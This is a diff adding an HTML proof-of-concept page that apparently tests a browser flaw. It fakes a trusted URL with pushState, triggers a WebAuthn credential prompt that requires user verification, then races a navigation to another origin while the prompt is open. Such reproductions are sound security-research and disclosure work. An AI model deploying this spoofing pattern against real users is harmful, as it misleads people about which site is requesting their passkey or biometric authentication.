@@ -2,12 +2,70 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Another Site</title>
+  <title>WebAuthn Navigation Demo</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      height: 100vh;
+    }
+    #panel {
+      display: none;
+      padding: 20px;
+      background: #eee;
+    }
+    #trigger {
+      margin: 40px;
+      padding: 12px 20px;
+      font-size: 16px;
+    }
+  </style>
 </head>
 <body>
-  <h2>Different Website</h2>
-  <p>User navigated to a new origin.</p>
 
-  <input type="text" placeholder="Search">
+<button id="trigger">Continue</button>
+<div id="panel">Trusted panel</div>
+
+<script>
+const trigger = document.getElementById('trigger');
+const panel = document.getElementById('panel');
+
+/*
+ * Step 1:
+ * Manipulate visible URL to a trusted-looking path
+ * + trigger WebAuthn
+ */
+trigger.onclick = async () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+
+  try {
+    await navigator.credentials.get({
+      publicKey: {
+        challenge: new Uint8Array(32),
+        timeout: 60000,
+        userVerification: "required"
+      }
+    });
+  } catch (e) {
+    console.log(e);
+  }
+};
+
+/*
+ * Step 2:
+ * Trigger a navigation race shortly after permission flow starts
+ */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com';
+      }, 3400);
+    });
+  });
+});
+</script>
+
 </body>
 </html>
